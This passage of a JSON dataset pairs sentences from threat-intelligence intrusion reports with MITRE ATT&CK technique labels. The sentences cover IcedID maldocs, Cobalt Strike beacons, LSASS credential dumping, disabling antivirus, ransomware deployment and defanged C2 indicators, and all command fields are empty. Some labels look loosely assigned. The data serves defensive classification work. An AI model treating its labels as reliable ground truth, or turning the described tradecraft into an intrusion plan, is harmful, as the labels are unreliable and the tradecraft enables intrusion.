    "text": "A batch file was run enumerating hostnames throughout the environment using nslookup.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Some further pivoting around systems and targeted discovery continued throughout the rest of the day.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors connected to a compromised server via RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From this server they would stage the ransomware deployment.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "They deployed the ransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Opening a command prompt, they moved through executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "They then used the batch scripts to execute the ransomware payload via PsExec and WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1074.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1074.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Two OPTIONS requests followed by a GET request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "User-agent fields mentioning Microsoft Office.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Specific HTTP headers such as X-Office-Major-Version , X-MSGETWEBURL , X-IDCRL_ACCEPTED , and UA-CPU.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the payload was written to the path retrieved from Application.DefaultFilePath, which is the default path used by Excel when it opens files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the IcedID payload is successfully written to disk, the following post deployment steps are initiated:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Rundll32.exe is copied into a file named calc.exe under the path returned by Application.DefaultFilePath .",
    "command": "",
    "labels": [
      "T1074.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Calc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "In this case, rundll32.exe was copied into the user Documents folder and named calc.exe.",
    "command": "",
    "labels": [
      "T1074.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The name ‘calc.exe’ is hard-coded into the VBA code and will not be changed.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "However, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used Cobalt Strike beacons throughout the intrusion.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on VirusTotal.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Here is the content of the payload, where we can observe an object being created in memory using an encoded string.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We will walk through decoding this string to view the Cobalt Strike configuration present within.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35 which allows for the next step of decoding the payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Second stage decoding:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After this an MZ header can be observed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "From there, the data can be saved and reviewed using 1768.py from Didier Stevens, revealing the Cobalt Strike configuration embedded within:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "exdudipo.dll: IcedID first stage.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "license.dat: Encoded version of the second stage which the first stage will load into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This is a very common method that IcedID has used for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled task was configured to execute every hour.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Privilege escalation was completed on two systems via the named pipe GetSystem feature within the Cobalt Strike tool.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The adversary was seen injecting code into legitimate processes via CreateRemoteThread which can be detected using Sysmon event ID 8.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The table below shows examples of injected processes found via an in memory yara scan using this Malpedia yara rule:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Files that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is the list of files seen being created and later deleted by the threat actor:",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors were observed accessing a file server, and browsing though files related to passwords.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As noted in a previous report, this value matches known mimikatz access patterns.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This activity was observed again on various hosts on the fourth and sixth days of the intrusion.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The discovery phase primarily utilized built-in Windows tools.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "One utility seen was chcp which allows you to display or set the code page number.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The discovery phase remained minimal leading into day six.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Following the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.",
    "command": "",
    "labels": [
      "T1047",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also used RDP during this intrusion.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case IcedID was observed with the campaign ID of 3298576311 communicating with a C2 server located at kicknocisd[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After initial connections, IcedID command and control traffic moved to the following servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Connections to one of the IcedID servers was observed in memory dumps from the beachhead host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In the execution section we covered utilities launched by the threat actors from the VNC activity.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Below is a screenshot of a packet captured from C2 traffic over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232) are seen:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actors targeted password documents on network shares.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "No overt exfiltration was observed so we assess that this occurred over existing command and control channels.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion, we observed the threat actors use multiple DLL Beacons that would call out to different Cobalt Strike C2 channels.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used batch scripts during the intrusion for a number of purposes, primarily to disable antivirus programs and execute payloads.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel.",
    "command": "",
    "labels": [
      "T1005",
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The payload was a Cobalt Strike Beacon in the form of a DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055",
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors did not waste any time, and within four minutes, they gained administrative credentials then began searching for the domain controllers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once the domain controllers were identified, they used Cobalt Strike’s “jump psexec_psh” capability, which creates a Windows service that executes a Beacon executable to move laterally.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The attacker’s preferred scripting various parts of the intrusion via batch scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "They had a script for persistence, defense evasion and execution tasks.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "A complete list of those scripts came from hxxps://styservice[.]com as we shared with the community in this tweet thread.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first batch script we saw was to schedule a task which would execute a command to load a Cobalt Strike Beacon into memory using regsvr32.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The lateral movement and execution of batch scripts continued with the operators expanding their network footprint.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "After landing on an “important” host, the first task was to execute various batch scripts to disable antivirus programs.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "On one host, common backup utilities were also disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They used this Beacon to run PowerView’s Invoke-ShareFinder module in an effort to discover potentially interesting directories and files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Minutes away from meeting their final objective, the operators manually searched for files and directories of interest for the second time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The deployment took place via wmic and batch scripts.",
    "command": "",
    "labels": [
      "T1047",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll:",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Below is a screenshot of packet where we can spot the GZIPLOADER downloading the first stage from the C2:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then downloaded an additional Cobalt Strike Beacon kaslose.dll via curl and executed it via regsvr32:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon IcedID execution, a scheduled task named {3D0CCC72-D85D-7A63-8C0A-66CF5BAFD686} was created.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task was scheduled to execute every hour:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The new scheduled task was registered under EID 106 as seen below.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "While analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This scheduled task with name HpSupport executed a Cobalt Strike Beacon kaslose64.dll both on the Domain Controller and the File Server:",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On the File Server, the same Scheduled task was created with a slightly different name:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Killing multiple Services and Disabling Security Tools",
    "command": "",
    "labels": [
      "T1543.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003",
      "T1543.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disabling Windows Defender using multiple techniques",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors executed three other scripts named fed1.bat, fed2.bat and fed3.bat using PowerShell and manipulating several registry keys to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors injected into a high privileged process and then access cached credentials from LSASS:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows EID: 4673 – A privileged service was called:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts, spoolsv.exe via remote service creation.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures. Rita is a framework for identifying command and control communication, also known as beaconing.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Beacon is the malware agent installed on the victim’s device and is responsible for communicating with the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/5.0; rv:11.0) like Gecko 20210505604",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on the Subject Common name (cdnwin.xyz) we can see that there are 5 Cobalt Strike servers associated with this group all hosted on HostHatch, and registered by NameCheap.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "croperdate.com (146.70.24.133:443) - This Cobalt Strike server was added to our Threat Feed on 07/27/2021.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Viper C2 framework was present as well as a Cobalt Strike kit which included TaoWu and Ladon extensions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Both Cobalt Strike and Viper framework files were visible in the open directory.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A zip archive that contained the files for a Cobalt Strike team server, included the plugins TaoWu and Ladon which extend the capabilities of the framework greatly.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The DFIR Report Threat Intel Team tracked the server as hosting active command and control from January 18th through Feburary 10th of 2024.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using data from the leaked server we identified a cluster of eight IP address’s all being used to proxy the command and control for the same threat actor and active for the same time frame.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The bash history included a nohup command to run a Cobalt Strike server with the following password and account details.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The IP 116.212.120.32 exposed the following beacon configuration, most notably a cracked watermark of 987654321.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor left behind the file 红队版.zip in the root of the open directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The zip contained a Cobalt Strike kit which was also the same that was extracted to the root of the open directory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The other major modules as part of this Cobalt Strike kit are TaoWu and Landon which extends Cobalt Strike’s capabilities.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It includes a huge number of precompiled binaries in the path taowu-cobalt-strike-master\\script :",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Ladon plugin for Cobalt Strike is a framework that allows for lots of automation of intrusion activity.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Viper is a command and control tool used for post exploitation activity.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Viper C2 management panel was observed listening on the default tcp port 60000, and using the default SSL certificates provided with the docker image.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed using the Viper C2 for post exploitation on a AWS host running a Bitnami WordPress app.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After initial access was gained, the vipermsf (Metasploit) backend was utilized to run a one-line command to upload and execute a file:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Information gathered from the Redis RDB dump file using (https://github.com/sripathikrishnan/redis-rdb-tools ) shows that the execution was successful, and the threat actor was able to achieve execution of the payload (recovered from the host info module):",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Due to the location of the payload being written to disk matching POC exploit code ( https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-25003.yaml ) , we assess with high confidence that initial access was gained through a WordPress plugin WPCargo exploit, specifically, the Remote Code execution vulnerability CVE-2021-25003.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Additional follow-on activity showed the threat actor uploading an additional file using a VIPER agent used for privilege escalation: traitor-amd64 upload completed",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When reviewing the Viper access logs, the initial service was listening on the domain fgfg.bcfnwg.cc:60000 .",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on the access and usage of Viper in the access.log of the server, we identified 101.36.124.183 as the IP address the threat actor was using at the time.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Command and control frameworks such as Metasploit and Sliver were then used for post exploitation activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In the Metasploit and Meterpreter history files we observed the following exploit modules used by the threat actor: exchange_proxylogon_rce – CVE-2021-26855 CVE-2021-27065, php_fpm_rce – CVE-2019-11043, vmware_vcenter_uploadova_rce – CVE-2021-21972",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this session, the threat actor gained nt authority\\system access and was observed performing some initial system discovery, as well as using the type command to write out a certificate file matching the name of one of the targets.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We observed the threat actor make a directory named exploits.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Then clone this exploit into it, cd into the directory, and attempt to exploit a target.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We observed the threat actor clone and then execute the exploit against a target.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "While eight systems were observed vulnerable in the nuclei scan output for this vulnerability – only one was observed being targeted in the bash history:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It covers several vulnerabilities and provides the ability to check target lists or networks, as well as exploit vulnerable hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "While the bash history only shows indications of the tools being run in file-scan mode (meaning the tools checks for vulnerabilities from a target list provided), additional output spanning an eleven day span was observed.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The pulse_secure_file_read.sh is a directory traversal vulnerability that can result in session information being stolen from the firewalls, and possibly reused.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Discussed further in the Command and Control section, the threat actor used multiple frameworks including Metasploit and Sliver.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor generated a number of various Sliver beacons over the time they used the server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the session log left behind, we were able to identify the threat actor used the web shell to identify sensitive information on the host:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used Sliver’s execute-assembly to load SharPersist.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Sliver audit log recorded the arguments provided to SharPersist which were used to create a Windows service called HealthCheck to run encoded PowerShell.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Loaded in the same way as above, SharPersist was used to create a scheduled task also called HealthCheck to run C:\\ProgramData\\Software\\svchost.exe :",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used Sliver to upload modified versions of .bashrc to compromised hosts and set up a coin miner.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "We were able to recover the uploaded files and can see the appended lines below:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The referenced autominionlx.sh is downloaded from the Sliver server:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used the built-in Meterpreter getsystem module which uses various techniques to create a payload as SYSTEM.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "During a meterpreter session, the threat actor created a scheduled task to launch a payload as NT AUTHORITY\\SYSTEM :",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "T1562.001 Impair Defenses: Disable or Modify Tools",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition to disabling UFW and killing several running services, the script then turns to enumerating all the private keys stored on the hosts, parsing all the hosts in the known_hosts files, as well as username associated with any keys found.",
    "command": "",
    "labels": [
      "T1083",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "T1083 File and Directory Discovery",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
